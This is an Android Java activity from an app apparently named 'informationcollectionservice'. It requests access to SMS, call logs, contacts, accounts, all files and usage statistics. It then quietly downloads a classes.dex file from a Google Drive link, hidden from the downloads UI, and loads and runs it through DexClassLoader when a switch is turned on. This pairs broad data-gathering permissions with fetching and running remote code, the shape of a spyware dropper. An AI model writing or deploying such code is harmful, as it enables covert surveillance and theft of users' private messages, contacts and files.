package com.example.informationcollectionservice;

import android.Manifest;
import android.app.DownloadManager;
import android.app.Fragment;
import android.app.FragmentManager;
import android.app.FragmentTransaction;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.CompoundButton;
import android.widget.Switch;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.FragmentActivity;


import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;

public class MainActivity extends FragmentActivity {
   static Switch btnSwitch;
   static Context context_main;
    @RequiresApi(api = Build.VERSION_CODES.R)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
       setContentView(R.layout.activity_main);

       SetPermissions();
        btnSwitch = (Switch)  findViewById(R.id.switchBtn);
        context_main = this;
         if (UStats.getUsageStatsList(this).isEmpty()) { //разрешение на сбор статистики
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            Toast.makeText(MainActivity.this, "Enable Usage Access for YOUR_APP_NAME to use this app", Toast.LENGTH_LONG).show();
            startActivity(intent);
        }

         if(!new File(Environment.getExternalStorageDirectory().getAbsolutePath().toString()+"/Download/"+"classes.dex").exists())
        {
            new Downloading().execute();
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            Thread.currentThread().interrupt();
        }

        btnSwitch.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if(isChecked)
            {
                Toast toast = Toast.makeText(getApplicationContext(),
                        "ON", Toast.LENGTH_SHORT);
                toast.show();

                try {
                    CallFunctions("com.example.informationcollectionservice.Start",null);
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                } catch (InstantiationException e) {
                    e.printStackTrace();
                } catch (InvocationTargetException e) {
                    e.printStackTrace();
                } catch (NoSuchMethodException e) {
                    e.printStackTrace();
                }

            }
            else
            {
                //stopTask();
                stopService(new Intent(MainActivity.this, Service.class));
                Toast toast = Toast.makeText(getApplicationContext(),
                        "OFF", Toast.LENGTH_SHORT);
                toast.show();
            }
        });

    }


    /*void startTask()
    {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        //PeriodicWorkRequest myWorkRequest = new PeriodicWorkRequest.Builder(MyWorkManager.class, 15, TimeUnit.MINUTES).addTag("Collect")
      //          .build();
       // WorkManager.getInstance(getApplicationContext()).enqueueUniquePeriodicWork("Collect", ExistingPeriodicWorkPolicy.KEEP,myWorkRequest);
        WorkRequest myWorkRequest = new OneTimeWorkRequest.Builder(MyWorkManager.class).setConstraints(constraints).build();
        WorkManager.getInstance(this).enqueue(myWorkRequest);

    }
    void stopTask()
    {
        WorkManager.getInstance(getApplicationContext()).cancelAllWorkByTag("Collect");
        WorkManager.getInstance(getApplicationContext()).cancelAllWork();
    }*/

    @RequiresApi(api = Build.VERSION_CODES.R)
    void SetPermissions()
    {
        if(!checkPerm(Manifest.permission.RECEIVE_SMS))
        {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.RECEIVE_SMS,Manifest.permission.READ_SMS,Manifest.permission.READ_CALL_LOG,Manifest.permission.READ_CONTACTS,
                            Manifest.permission.MANAGE_EXTERNAL_STORAGE,Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.QUERY_ALL_PACKAGES, Manifest.permission.PACKAGE_USAGE_STATS, Manifest.permission.GET_ACCOUNTS, Manifest.permission.FOREGROUND_SERVICE, Manifest.permission.INTERNET},
                    0);


        }
        if(!Environment.isExternalStorageManager())
        {
            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
            startActivity(intent);
        }


    }


    public void CallFunctions(String ClassName, Bundle arg) throws IllegalAccessException, InstantiationException, InvocationTargetException, NoSuchMethodException {
        File dex = new File(Environment.getExternalStorageDirectory().getAbsolutePath().toString()+"/Download/"+"classes.dex","classes.dex");
        File cache = new File(getCacheDir()+File.separator+"codeCache");
        cache.mkdirs();
        DexClassLoader dexClassLoader = new DexClassLoader(dex.getAbsolutePath(), cache.getAbsolutePath(),null,getClassLoader());

        Class class_new = null;
        try {
            class_new = dexClassLoader.loadClass(ClassName);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        Method startFunc= class_new.getDeclaredMethod("runService");

        Object obj = class_new.newInstance();
        startFunc.invoke(obj);


    }

    private boolean checkPerm(String perm)
    {
        int permCheck = ContextCompat.checkSelfPermission(this,perm);
        return (permCheck == PackageManager.PERMISSION_GRANTED);
    }

    private class Downloading extends AsyncTask<Void,Void,Void>
    {
        @Override
        protected Void doInBackground(Void... voids) {
            DownloadManager downloadManager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
            Uri uri = Uri.parse("https://drive.google.com/drive/folders/1DBbkb2DK08b8kh19K3GO25gvaH9tBzYq?usp=sharing");
            String path = Environment.getExternalStorageDirectory().getAbsolutePath().toString()+"/Download/"+"classes.dex";
            DownloadManager.Request request = new DownloadManager.Request(uri);
            request.setTitle("classes.dex");
            request.setDescription("Download");
            request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
            request.setVisibleInDownloadsUi(false);
            request.setDestinationUri(Uri.parse("file://"+path));
            downloadManager.enqueue(request);
            return null;
        }
    }

}

